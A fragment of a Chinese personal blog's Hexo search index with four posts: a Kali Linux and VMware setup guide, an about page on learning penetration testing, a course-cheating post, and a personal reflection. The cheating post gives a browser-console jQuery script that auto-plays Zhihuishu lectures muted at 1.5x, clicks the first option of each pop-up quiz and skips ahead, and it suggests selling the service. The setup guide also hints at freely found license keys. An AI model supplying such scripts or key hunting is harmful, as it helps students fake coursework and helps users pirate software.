        <content type="html"><![CDATA[<p>在我们翻开一本关于开发类的书籍的时候都会看到一句：“工欲善其事必先利其器”，这句话给我们的意思呢大概就是，要想学好编程，首先得有开发工具，接下来，我就来讲怎么安装Linux kali 系统的环境，这时候很多人会产生疑惑，不久是个系统吗直接装不就好了？为啥还要环境，由于kali系统是全root模式安全性为0，容易被病毒入侵，不利于测试，几乎很少有人把它直接装在自己的电脑硬盘上，所以这时候我们有需要一个虚拟机，（简单说一下虚拟机的概念：虚拟机它就是可以模拟各种系统运行的一个软件，通常都指-VMware）<br><a href="https://blog.csdn.net/baijinswpu/article/details/80835417" target="_blank" rel="noopener">虚拟机安装教程</a></p><p>这时候呢你电脑上已经有虚拟机软件了，接下来就需要linux kali的镜像文件进行安装到虚拟机上就ok了<br>注意网络模式要设为桥接！还有就是密匙网上都有！随便搜一下就永久免费啦！下面附上kali系统的安装教程。<br><a href="https://blog.csdn.net/qq_40950957/article/details/80468030" target="_blank" rel="noopener">kali系统安装教程</a></p><p>到这我相信你已经安装好了kali系统的环境！！！，如果有问题可以点博客下的企鹅咨询我！</p>]]></content>
      
      
      <categories>
          
          <category> kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境 </tag>
            
            <tag> Kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于本站</title>
      <link href="/2019/06/09/web/aboutweb/"/>
      <url>/2019/06/09/web/aboutweb/</url>
      
        <content type="html"><![CDATA[<p>我是个非常懒的人，非常不自律，嗯，可能在老师眼里我就是那个学习吊儿郎当，不踏实的学生，虽然老师们没有直说，但我还是能看清自己，俗话说的好知错能改就是好孩子，<br>所以呢！我决定时常反省一下自己，没事就写写博客吧！起初没想好写些什么，圈子里都讲不想当黑客的程序员不是好程序员，于是我想写写关于linux kali渗透测试的东西，<br>其实黑客的概念非常广泛，就像白帽子于黑帽子那样，嗯，可以想一下白天白帽子晚上黑帽子（当然这是开玩笑的！）学习这方面东西是要有一定原则的，不能去干那啥事情！在这儿我将会分享一些技术，希望能激起你对计算机的兴趣！</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>智慧树刷课秘籍</title>
      <link href="/2019/05/21/class/"/>
      <url>/2019/05/21/class/</url>
      
        <content type="html"><![CDATA[<p>网课可以自己刷，很多人花钱去弄，我觉得没必要，简述一下最安全的刷课方法，你看了之后，或许可以利用它赚钱，话不多说，</p><p>登陆！<br>登上之后选择你要看的一门课，然后播放，一般浏览器按f12就会调出开发者模式，建议用谷歌，这个下学期写网页也会用到，将下面一段js代码复制粘贴到开发者模式下的console窗口内<br>代码从下面var开始复制，js中只有var类型变量..话不多说<br><code>var ti = $(&quot;body&quot;);var video = $(&quot;.catalogue_ul1 li[id*=video-]&quot;);var i = 1;var v = 1;video.css(&quot;color&quot;, &quot;blue&quot;);console.log(&quot;已选取&quot; + video.length + &quot;个小节,并已用蓝色标明,请检查是否有遗漏,如有遗漏,概不负责&quot;);setTimeout(function () {    $(&#39;.speedTab15&#39;).click();    $(&#39;.volumeIcon&#39;).click();    console.log(&quot;已进行静音和1.5倍加速&quot;);}, 3000);ti.on(&quot;DOMNodeInserted&quot;, function (e) {    if (e.target.textContent == &quot;关闭&quot;) {        console.log(&quot;检测到第&quot; + i + &quot;个弹题窗口&quot;);        window.setTimeout(function () {            document.getElementById(&quot;tmDialog_iframe&quot;).contentWindow.document.getElementsByClassName(&quot;answerOption&quot;)[0].getElementsByTagName(&quot;input&quot;)[0].click();            $(&quot;.popbtn_cancel&quot;).click();            console.log(&quot;已关闭&quot;);        }, 3000);        i++;    } else if (e.target.textContent == &quot;本节视频,累计观看时间『100%』&quot;) {        console.log(&quot;检测到视频观看完成，准备跳到下一节&quot;);        $(&#39;.next_lesson_bg&#39;).find(&#39;a&#39;).trigger(&#39;click&#39;);        console.log(&quot;已跳转&quot;);        setTimeout(function () {            $(&#39;.volumeIcon&#39;).click();            $(&#39;.speedTab15&#39;).click();            console.log(&quot;已进行静音和1.5倍加速&quot;);        }, 6000);        v++;        console.log(&quot;目前播放了&quot; + v + &quot;个视频&quot;);    }});</code><br>按回车运行js代码,（代码于2019.3.24号优化更新）之后电脑就会自己刷课<br>虽然代码有静音操作，但是还是建议把声音关了，因为时不时会bug一下出声</p>]]></content>
      
      
      <categories>
          
          <category> 刷课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网课 </tag>
            
            <tag> 秘籍 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我常问自己如何放下</title>
      <link href="/2019/05/20/hello-world/"/>
      <url>/2019/05/20/hello-world/</url>
      
        <content type="html"><![CDATA[<h3 id="执念"><a href="#执念" class="headerlink" title="执念"></a>执念</h3><p>每天夜里我辗转反侧难以入睡，我时常梦见过去，即使是一些很小的事情在每天电影般的梦境当中也得到了无限放大，渐渐的我发现善良是一种懦弱，你对别人的好，很多人觉得理所当然，反而更多的人会因为你善良而利用你，其实反过来想也没有错，弱肉强食的丛林法则更古不变。  </p><p>我从小在学校里长大，父母教给我善良，教我为人处事低调，实实在在，教我以大局为重，多为别人着想，以至于我很少去拒绝别人(造成我吃亏)。能帮上什么就帮，但即使是这样依然为不住很多人。人们不懂得感恩，不懂得受人滴水之恩当涌泉相报，其实人本就没有义务去帮….<br>拿钱来说，最能看清一个人，这个人有没有诚信，，，还钱只是取决于想不想，没有忘不忘一说，如果他忘了那只能说明他对你的帮助当作了理所当然，能用钱去看清一个人的人品那这人非常廉价。</p><h3 id="我错在哪？"><a href="#我错在哪？" class="headerlink" title="我错在哪？"></a>我错在哪？</h3><p>我错就错在用自己的标准去衡量别人，每个人的格局都不同，也许你认为他做的不对，或许在他看来他做的没什么不妥，他认知不到自己有问题。</p><p>其实人的突破点就在这儿，知耻而后勇，知弱而图强，知错能改善莫大焉。</p><h3 id="人性的弱点"><a href="#人性的弱点" class="headerlink" title="人性的弱点"></a>人性的弱点</h3><p>这个世界有颜色的人太多，以颜色看人也太正常了，你牛逼了放屁都香，不牛逼只会被人看不起，牛逼的人大都懂得欣赏别人，反之不牛逼的人往往看不起别人，更多是看不起没有钱的人。<br>我研究社工有段时间了，当下社会价值观本就病态，谁好也好，不好也好，，看不惯的事情太多了，何必给我自己找难过呢？放下执念，当个恶人，岂不快哉？</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
